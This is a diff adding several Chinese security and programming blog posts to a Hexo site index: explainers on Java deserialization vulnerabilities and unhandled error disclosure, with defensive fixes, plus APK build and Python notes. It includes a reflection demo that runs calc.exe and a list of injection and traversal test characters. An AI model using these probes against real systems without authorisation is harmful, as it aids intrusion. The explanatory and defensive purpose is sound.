+<li><a href="https://cn.bing.com/robots.txt" target="_blank" rel="noopener">https://cn.bing.com/robots.txt</a> </li>
+<li><a href="https://zh.wikipedia.org/robots.txt" target="_blank" rel="noopener">https://zh.wikipedia.org/robots.txt</a> </li>
+<li>……</li>
+</ul>
+<h3 id="0x05-robots-txt生成工具"><a href="#0x05-robots-txt生成工具" class="headerlink" title="0x05 robots.txt生成工具"></a>0x05 robots.txt生成工具</h3><ul>
+<li>robots文件生成—站长工具： <a href="http://tool.chinaz.com/robots/" target="_blank" rel="noopener">http://tool.chinaz.com/robots/</a> </li>
+<li>在线robots.txt文件生成工具-站长辅助工具 -W3Cschool:  <a href="https://www.w3cschool.cn/tools/index?name=createrobots" target="_blank" rel="noopener">https://www.w3cschool.cn/tools/index?name=createrobots</a> </li>
+<li>在线robots.txt文件生成-在线网站robots.txt文件生成器：  <a href="http://www.jsons.cn/robots/" target="_blank" rel="noopener">http://www.jsons.cn/robots/</a> </li>
+</ul>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>不安全的配置</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞名称：反序列化漏洞</title>
+    <url>/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>严重性：Medium</p>
+<p>漏洞类型：不安全的配置</p>
+<p>安全性：使用扫描器或人工测试，常见中间件，weblogic、websphere等存在java反序列化漏洞</p>
+<h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p>​        序列化是将对象或数据转换为可以恢复的数据格式的过程，反序列化与序列化正好相反，是指将对象或数据恢复为原有格式的过程。目前最流行的数据反序列化方式是JSON，以前则是XML。除了数据的序列化外，很多语言还提供对象的序列化与反序列化，这些特定的格式具有比JSON、XML更多的特性，但特性的增多也带来了潜在的问题——反序列化漏洞。</p>
+<h3 id="0x01-Java的序列化与反序列化"><a href="#0x01-Java的序列化与反序列化" class="headerlink" title="0x01 Java的序列化与反序列化"></a>0x01 Java的序列化与反序列化</h3><p>Java允许在内存中创建和复用Java对象，只要JVM虚拟机一直处于运行状态，就可以对这些对象进行调用，因此Java对象的生命周期要短于JVM虚拟机的生命周期。如果想要持久化对象的存储，就需要将对象序列化再进行保存，使用时读取存储的对象数据，进行反序列化，就可以直接使用存储的对象，非常方便。</p>
+<p>将Java对象进行序列化时，一般只保存对象的状态和对象的成员变量，而不会直接保存类中的静态变量。Java对象的序列化除了能够进行对象的持久化存储外，还可以用于对象在网络中传输及远程方法调用（RMI)等。</p>
+<p>序列化是实现Serializable接口，然后利用ObjectOutputStream和FileOutputStream进行对象的持久化存储。</p>
+<p>反序列化是先通过FIleOutputStream读取存储的序列化对象的数据，然后用ObjectInputStream获得FileInputStream读取的数据。</p>
+<h3 id="0x02-Java反序列化漏洞"><a href="#0x02-Java反序列化漏洞" class="headerlink" title="0x02 Java反序列化漏洞"></a>0x02 Java反序列化漏洞</h3><p>Java的反射机制提供为Java工程师的开发提供了相当多的便利性，同样也带来了潜在的安全风险。反射机制可以越过Java本身的静态检查和类型约束，在运行期间直接访问和修改目标对象的属性和状态。Java反射的四大核心是Class、Constructor、Field、Method。如下例，利用Java的反射机制来操纵代码调用本地的计算器</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>{</span><br><span class="line"></span><br><span class="line">		Object runtime=Class.forName(<span class="string">"java.lang.Runtime"</span>)</span><br><span class="line"></span><br><span class="line">						.getMethod(<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[]{})</span><br><span class="line"></span><br><span class="line">						.invoke(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">		Class.forName(<span class="string">"java.lang.Runtime"</span>)</span><br><span class="line"></span><br><span class="line">						.getMethod(<span class="string">"exec"</span>,String<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line">						.invoke(runtime,"calc.exe");</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="comment">//以上代码主要逻辑</span></span><br><span class="line"><span class="comment">//1. 获取Runtime的Class对象，分别获取Runtime类的Class对象的getRunTime方法和exec方法</span></span><br><span class="line"><span class="comment">//2. 利用invoke进行调用获得Runtime对象实例，利用exe方法的Method对象进行invoke调用，持行系统命令，获取命令持行打印输出</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>Java反射机制把代码意图都利用字符串的形式进行体现，使原本应该是字符的属性变成了代码执行的逻辑。</p>
+<p> Java反序列化漏洞触发过程如下图所示：</p>
+<p><img src="https://img.chainnews.com/material/images/28de62fba20274b830caeb6001a2e7a7.jpg" alt="âååºååæ¼æ´è§¦åè¿ç¨âçå¾çæç´¢ç»æ"> </p>
+<p>以上可以看出Java反序列化漏洞形成的原因在于开发人员构建自定义序列化操作时，即自定义readObject（）方法时处理不当，使得攻击者能够向反序列化方法中插入恶意代码，恶意代码在对象反序列化的时候被执行，造成漏洞的产生。因此要注意，在实现自定义的readObject（)方法时，不要给攻击者留下控制该方法的可能性。</p>
+<p>除了readObject()方法会造成反序列化漏洞外，以下方法也可能造成反序列化漏洞，包括readObjectNoData()、readResolve()及readExternal()。</p>
+<h3 id="0x03-检测反序列化漏洞"><a href="#0x03-检测反序列化漏洞" class="headerlink" title="0x03 检测反序列化漏洞"></a>0x03 检测反序列化漏洞</h3><p>对于反序列化漏洞的检测，可以从两个方面入手：流量、源码</p>
+<ul>
+<li>如果能够直接获得应用程序的源码，可以直接从源码着手，分析能够造成反序列化漏洞的函数，如readObject()、readObjectNoData()、readResolve()和readExternal()。如它们包含用户可以直接控制的数据，则应用很可能存在反序列化漏洞，需要其进一步进行测试。</li>
+<li>当无法获得应用程序的源码时，进行反序列化漏洞检测可以从应用程序接收的数据着手，分析应用是否接受序列化对象作为参数，或者分析数据中是否包含aecd0005或r0oAB这些特征值，然后构造测试脚本，可以手工生成，也可以通过工具自动生成，如ysoserial，最后使用这些测试脚本对应用进行反序列化漏洞的测试。</li>
+</ul>
+<h3 id="0x04-反序列化漏洞的防护"><a href="#0x04-反序列化漏洞的防护" class="headerlink" title="0x04 反序列化漏洞的防护"></a>0x04 反序列化漏洞的防护</h3><p>反序列化漏洞的防护可以从以下几个方面进行：</p>
+<ul>
+<li><p><strong>阻止类的反序列化</strong></p>
+<p>如果一个类不需要被反序列化，那么就不要让它实现Serializable接口，但是如果该类继承了一个实现Serializable接口的类，这时为了防止该类被反序列化，可以在类中申明一个final修饰的readObject()方法，并且该方法会始终抛出一个异常，示例如下：</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span></span>{</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span>{</span><br><span class="line"></span><br><span class="line">	<span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"can not be deSerializable!"</span>);</span><br><span class="line"></span><br><span class="line">	}<span class="keyword">catch</span>(IOException e){</span><br><span class="line">		e.printStackTrace();</span><br><span class="line"></span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这样在进行反序列化操作时，就会抛出IO异常，从而阻止对象的反序列化操作。</p>
+</li>
+<li><p><strong>使用白名单限制反序列化的类</strong></p>
+<p>限制所有类的反序列化并不现实，但是可以通过白名单的方式来限制某些类的的反序列化，尽量不要使用黑名单的方式，这回存在被”绕过“的可能。</p>
+<p>由于反序列化操作是通过Java.io.objectInputStream读取对象的反序列化数据，因此可以在该类上实现反序列化操作的限制，方法就是重写resolveClass()方法，因为该方法的调用就是在readObject()方法之前，能够在序列化前进行检测。通常使用自定义工具或者SeriaKiller工具两种方式来介绍限制反序列化的类的方法。</p>
+</li>
+<li><p><strong>使用代理限制反序列化的类</strong></p>
+<p>通过对ObjectInputStream类的resolveClass()方法进行重构，能够起到限制反序列化的类的作用，但是如果无法对源码进行修改，那么这种方式将不再有效，此时就需要通过JVM代理的方式来限制反序列化的类。</p>
+<p>当不知道应用内部的那些类将要被反序列化时，可以通过黑名单的方式来限制反序列化的类，以降低系统被攻击的风险。如果了解应用内部允许被反序列化的类，可以直接使用安全性更高的白名单方式。实现这种防御方式的工具有contra-rO0等</p>
+</li>
+<li><p><strong>辅助措施</strong></p>
+<p>除了各种方式限制反序列化的类外，还可以通过一些辅助措施来缓解反序列化漏洞。transient关键字可以修饰类变量，能够控制变量的序列化，在变量申明时添加这个关键字就可以阻止变量被序列化到文件中。被反序列化时，transient修饰的变量将会被设置成初始值，如int型被设置为0，字符串被会设置为null等。如果对象的成员在反序列化不应由用户控制并在序列化后需要展现给用户，也可以使用transient关键字进行修饰。</p>
+<p>此外尽量使用JSON、XML这种纯数据格式的类型进行反序列化操作，避免使用原生的序列化对象，这样能降低反序列化的风险。</p>
+</li>
+</ul>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>不安全的配置</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞名称：应用程序未容错</title>
+    <url>/2020/02/28/%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9A%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9C%AA%E5%AE%B9%E9%94%99/</url>
+    <content><![CDATA[<p>严重性：Medium</p>
+<p>漏洞类型：不安全的配置</p>
+<p>安全要求：当系统发现异常访问或出故障时，统一出提示，应避免敏感信息泄露及显示详细错误信息。</p>
+<h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p>应用程序容错就是没有屏蔽执行过程中的错误信息，直接抛出了异常，导致一些敏感信息的泄露以及显示了详细的错误信息。</p>
+<h3 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h3><p>一般时web应用程序接收用户输入的信息后，如果出现异常，类似于数据类型的错误、空值、非法字符等造成程序不能继续执行，导致抛出异常错误信息。</p>
+<h3 id="0x02-常见场景"><a href="#0x02-常见场景" class="headerlink" title="0x02 常见场景"></a>0x02 常见场景</h3><ul>
+<li>查询功能</li>
+<li>上传文件功能</li>
+<li>访问不存在的页面</li>
+</ul>
+<h3 id="0x03-测试方法"><a href="#0x03-测试方法" class="headerlink" title="0x03 测试方法"></a>0x03 测试方法</h3><p>向Web提交一些恶意字符：</p>
+<ul>
+<li><p>%df</p>
+</li>
+<li><p>%27</p>
+</li>
+<li><p>%20</p>
+</li>
+<li><p>‘</p>
+</li>
+<li><p>}</p>
+</li>
+<li><p>;</p>
+</li>
+<li><p>)</p>
+</li>
+<li><p>-</p>
+</li>
+<li></li>
+<li><p>../../</p>
+</li>
+<li><p>……</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-04-27/0x03.png" alt="应用程序未容错"></p>
+</li>
+</ul>
+<h3 id="0x04-安全建议"><a href="#0x04-安全建议" class="headerlink" title="0x04 安全建议"></a>0x04 安全建议</h3><p><strong>PHP</strong></p>
+<p>在页面中添加：</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>或更改php.ini</p>
+<p>display_errors的默认值为On,代表错误信息的显示。但如果设置成Off,就会关闭所有的错误提示</p>
+<p><strong>Tomcat</strong></p>
+<p>修改web.xml，加入如下代码</p>
+<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">error-code</span>&gt;</span>500<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">location</span>&gt;</span>/error.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p><strong>IIS</strong></p>
+<p>“网站属性”-&gt;“主目录”-&gt;“应用程序的配置”-&gt;”调试“,选择“向客户端发送下列文本信息”</p>
+<p>首先找到Internet信息服务（IIS)管理器</p>
+<p>然后点击“属性”</p>
+<p>选择“主目录”</p>
+<p>点击“配置”</p>
+<p>选择”调试“</p>
+<p>选择“向客户端发送下列文本错误消息”，根据文本框自定义输入错误提示信息。</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>不安全的配置</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>APK应用构建过程</title>
+    <url>/2020/02/28/APK%E5%BA%94%E7%94%A8%E6%9E%84%E5%BB%BA%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<p><img src="../images/apkCreate.png" alt=""></p>
+<ol>
+<li><p>编译资源文件，如AndoridManifest.xml和用于构建UI布局的xml文件等。</p>
+<p>使用的aapt就是（android asset package tool,安卓资源文件打包工具），会生成一个R.java文件，该文件包含代码中可以引用的一些常量。</p>
+</li>
+<li><p>如果项目使用了.aidl（android Interface definition language,安卓接口定义语言）文件，aidl工具会把它转换为.java文件。</p>
+<p>注：不同的应用的客户端进行访问服务，并进行相应的进程间通信（IPC),以及在服务中处理多线程时，就会用到aidl文件。</p>
+</li>
+<li><p>所有的java文件都准备好，可以使用Java 编译器进行编译。Javac就是编译java文件的工具，将java文件编译成.class文件</p>
+</li>
+<li><p>所有的.class文件都需要转换成.dex文件，这一步借助dx工具完成，生成classes.dex的dex文件</p>
+</li>
+<li><p>上一步生成的classes.dex文件、图片等尚未编译的资源以及其他已编译的资源会被发送到APK builder工具，然后打包成APK文件，即安卓应用包。</p>
+</li>
+<li><p>生成的apk文件要安装到设备上或模拟器中去，需要debug.key或release key对其进行签名。开发时可以用IDE的debug.key签名。 签名过程可以使用Java keytool和jarsigner手动签名。</p>
+</li>
+<li><p>正式发布之后，需要给它签上relese key，签上relese key之后，必须要使用zipalign工具对其进行对齐优化处理，以便优化应用在设备上运行时的内存占用。</p>
+</li>
+</ol>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>移动安全</category>
+      </categories>
+      <tags>
+        <tag>APK应用</tag>
+        <tag>Android</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python实现项目安全评分计算</title>
+    <url>/2020/02/28/Python%E5%AE%9E%E7%8E%B0%E9%A1%B9%E7%9B%AE%E5%AE%89%E5%85%A8%E8%AF%84%E5%88%86%E8%AE%A1%E7%AE%97/</url>
+    <content><![CDATA[<p>概述：Excel格式分为两种：xls(Excel 97-2003)和xlsx(Excel 2007及以上)，本次读取Excel数据使用的是xlrd模块。</p>
+<h4 id="0x01-安装xlrd模块"><a href="#0x01-安装xlrd模块" class="headerlink" title="0x01 安装xlrd模块"></a>0x01 安装xlrd模块</h4><figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">pip install xlrd</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="0x02-xlrd库使用说明"><a href="#0x02-xlrd库使用说明" class="headerlink" title="0x02 xlrd库使用说明"></a>0x02 xlrd库使用说明</h4><p>demo数据如下：</p>
+<table>
+<thead>
+<tr>
+<th>项目代码</th>
+<th>项目名称</th>
+<th>测试耗时(h)</th>
+<th>漏洞总数</th>
+<th>高危漏洞</th>
+<th>中危漏洞</th>
+<th>低危漏洞</th>
+<th>安全评分</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1906</td>
+<td>A06</td>
+<td>67</td>
+<td>8</td>
+<td>3</td>
+<td>2</td>
+<td>3</td>
+<td></td>
+</tr>
+<tr>
+<td>1907</td>
+<td>B07</td>
+<td>32</td>
+<td>20</td>
+<td>5</td>
+<td>9</td>
+<td>6</td>
+<td></td>
+</tr>
+<tr>
+<td>1908</td>
+<td>C08</td>
+<td>40</td>
+<td>13</td>
+<td>7</td>
+<td>2</td>
+<td>4</td>
+<td></td>
+</tr>
+<tr>
+<td>1909</td>
+<td>D09</td>
+<td>80</td>
+<td>15</td>
+<td>9</td>
+<td>3</td>
+<td>3</td>
+<td></td>
+</tr>
+<tr>
+<td>1910</td>
+<td>E10</td>
+<td>88</td>
+<td>28</td>
+<td>12</td>
+<td>8</td>
+<td>8</td>
+<td></td>
+</tr>
+<tr>
+<td>1911</td>
+<td>F11</td>
+<td>140</td>
+<td>24</td>
+<td>13</td>
+<td>10</td>
+<td>1</td>
+<td></td>
+</tr>
+<tr>
+<td>1912</td>
+<td>G12</td>
+<td>24</td>
+<td>9</td>
+<td>4</td>
+<td>3</td>
+<td>2</td>
+<td></td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>打开文件，查看所有sheet列表</p>
+</blockquote>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xlrd     <span class="comment">#导入库</span></span><br><span class="line">xlsx= xlrd.open_workbook(<span class="string">'CVSdemo.xlsx'</span>)    <span class="comment">#打开文件</span></span><br><span class="line">print(<span class="string">'All sheets: %s'</span> % xlsx.sheet_names())   <span class="comment">#c查看所有sheet列表</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>只有一张sheet,即结果如下：</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">All sheets: [<span class="string">'sheet1'</span>]</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>查看sheet1中的数据</p>
+</blockquote>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">sheet1 = xlsx.sheets()[<span class="number">0</span>]   <span class="comment">#获得第一张sheet表，索引从0开始</span></span><br><span class="line">sheet1_name = sheet1.name   <span class="comment">#获得sheet1的名称</span></span><br><span class="line">sheet1_cols = sheet1.ncols  <span class="comment">#获得sheet1的列数</span></span><br><span class="line">sheet1_nrows = sheet1.nrows <span class="comment">#获得行数</span></span><br><span class="line">print(<span class="string">'Sheet1 Name: %s\nSheet1 cols: %s\nSheet1 rows: %s'</span> %(sheet1_name,sheet1_cols,sheet1_nrows))</span><br></pre></td></tr></tbody></table></figure>
+
+<p>结果如下：</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">All sheets: [<span class="string">'Sheet1'</span>]</span><br><span class="line">Sheet1 Name: Sheet1                                                          </span><br><span class="line">Sheet1 cols: <span class="number">7</span></span><br><span class="line">Sheet1 rows: <span class="number">100</span></span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>查看sheet1的特定切片数据</p>
+</blockquote>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">sheet1_nrows4 = sheet1.row_values(<span class="number">8</span>)    <span class="comment">#获得第8行数据</span></span><br><span class="line">sheet1_cols2 = sheet1.col_values(<span class="number">1</span>)     <span class="comment">#获得第1列数据</span></span><br><span class="line">cell23=sheet1.row(<span class="number">2</span>)[<span class="number">3</span>].value           <span class="comment">#查看第3行第4列数据</span></span><br><span class="line">print(<span class="string">'Row 4: %s\nCol 2: %s\nCell 1: %s\n'</span> % (sheet1_nrows4, sheet1_cols2, cell23))</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>查看表的明细数据</p>
+</blockquote>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(sheet1_nrows): <span class="comment">#逐行打印sheet1数据</span></span><br><span class="line">    print(sheet1.row_value(i))</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="0x03-公式规则转化代码"><a href="#0x03-公式规则转化代码" class="headerlink" title="0x03 公式规则转化代码"></a>0x03 公式规则转化代码</h4><p>高危的基础分是H，中危的基础分是M，低危的基础分是L。</p>
+<p>计算公式中其他选项的参数，产品安全测试所需时间H（单位*小时），安全测试人员数量S</p>
+<p>公式如下：<br>$$<br>CVS=100-(H<em>High数量+M</em>Medium数量+L*Low数量）<br>$$<br>根据项目大小的划分，漏洞等级基础分也不同，详情如下：</p>
+<table>
+<thead>
+<tr>
+<th>项目类型</th>
+<th>测试耗时h</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>大</td>
+<td>(80,+∞)</td>
+</tr>
+<tr>
+<td>中</td>
+<td>(40,80]</td>
+</tr>
+<tr>
+<td>小</td>
+<td>(0,40]</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th><strong>严重等级\项目类型</strong></th>
+<th><strong>大</strong></th>
+<th><strong>中</strong></th>
+<th><strong>小</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>High</strong></td>
+<td>2.0</td>
+<td>3.0</td>
+<td>4.5</td>
+</tr>
+<tr>
+<td><strong>Medium</strong></td>
+<td>0.9</td>
+<td>1.5</td>
+<td>2.5</td>
+</tr>
+<tr>
+<td><strong>Low</strong></td>
+<td>0.6</td>
+<td>0.9</td>
+<td>1.5</td>
+</tr>
+</tbody></table>
+<p><strong>注：安全评分计算示例如下：</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>项目名称</strong></th>
+<th><strong>项目代码</strong></th>
+<th><strong>测试耗时</strong></th>
+<th><strong>漏洞总数</strong></th>
+<th><strong>高危漏洞</strong></th>
+<th><strong>中危漏洞</strong></th>
+<th><strong>低危漏洞</strong></th>
+<th><strong>安全评分</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>数据中心</td>
+<td>DAP</td>
+<td>40h</td>
+<td>8</td>
+<td>4</td>
+<td>3</td>
+<td>1</td>
+<td>73</td>
+</tr>
+</tbody></table>
+<p>·      项目类型：小</p>
+<p>·      各漏洞基础分：High=4.5，Medium=2.5，Low=1.5</p>
+<p>·      安全评分：<br>$$<br>CVS=100-(4.5<em>4+2.5</em>3+1.5*1)=100-27=73<br>$$<br>·      安全等级：一般</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(sheet1_nrows):				<span class="comment">#按行进行遍历</span></span><br><span class="line">    timeOfTest = sheet1.row(i+<span class="number">1</span>)[<span class="number">2</span>].value	<span class="comment">#取值为测试用时数量</span></span><br><span class="line">    numOfHihg = sheet1.row(i+<span class="number">1</span>)[<span class="number">4</span>].value	<span class="comment">#取值为高危漏洞数量</span></span><br><span class="line">    numOfMedium = sheet1.row(i+<span class="number">1</span>)[<span class="number">5</span>].value  <span class="comment">#取值为中危漏洞数量</span></span><br><span class="line">    numOfLow = sheet1.row(i+<span class="number">1</span>)[<span class="number">6</span>].value     <span class="comment">#取值为低危漏洞数量</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> timeOfTest:							<span class="comment">#判断测试时间是否正常，大于0则正常</span></span><br><span class="line">    	<span class="keyword">if</span> timeOfTest &gt; <span class="number">80</span>:</span><br><span class="line">    		CVS = <span class="number">100</span>-(numOfHigh*<span class="number">2.0</span> + numOfMedium*<span class="number">0.9</span> + numOfLow*<span class="number">0.6</span>)</span><br><span class="line">    	<span class="keyword">elif</span> timeOfTest &gt; <span class="number">40</span>:</span><br><span class="line">    		CVS = <span class="number">100</span>-(numOfHigh*<span class="number">3.0</span> + numOfMedium*<span class="number">1.5</span> + numOfLow*<span class="number">0.9</span>)</span><br><span class="line">    	<span class="keyword">else</span>:</span><br><span class="line">        	CVS = <span class="number">100</span>-(numOfHigh*<span class="number">4.5</span> + numOfMedium*<span class="number">2.5</span> + numOfLow*<span class="number">1.5</span>) </span><br><span class="line">            </span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'测试耗时数据错误，运行结束'</span>)		<span class="comment">#测试耗时小于0,错误退出</span></span><br><span class="line">        </span><br><span class="line">      print(<span class="string">'CVS: %s\n'</span> % CVS)</span><br></pre></td></tr></tbody></table></figure>
+
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>编程</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VS Code配置Python开发环境</title>
+    <url>/2020/02/28/VS-Code%E9%85%8D%E7%BD%AEPython%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</url>
+    <content><![CDATA[<h4 id="步骤如下："><a href="#步骤如下：" class="headerlink" title="步骤如下："></a>步骤如下：</h4><ol>
+<li><p>安装VS Code扩展插件Python   ext python</p>
+</li>
+<li><p>配置Python环境，Ctrl+Shift+P ,输入Python: Select Interpreter</p>
+</li>
+<li><p>python库安装之pip工具</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>install</td>
+<td>安装库</td>
+<td>pip install 安装库名称<br>pip install -U 库名称：更新库</td>
+</tr>
+<tr>
+<td>uninstall</td>
+<td>卸载库</td>
+<td>pip uninstall 卸载库名称</td>
+</tr>
+<tr>
+<td>list</td>
+<td>列出已安装信息</td>
+<td>pip list<br>pip list -outdated:列出需要更新的库</td>
+</tr>
+<tr>
+<td>show</td>
+<td>列出已安装信息</td>
+<td>pip show 安装库名称</td>
+</tr>
+<tr>
+<td>search</td>
+<td>通过PyPI搜索库</td>
+<td>pip search关键字</td>
+</tr>
+<tr>
+<td>help</td>
+<td>帮助命令</td>
+<td>pip help install</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>VS Code中打开终端ctrl+`，默认打开Powershell </p>
+</li>
+</ol>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>编程</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+        <tag>VS Code</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hello World</title>
     <url>/2020/02/26/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></tbody></table></figure>
 
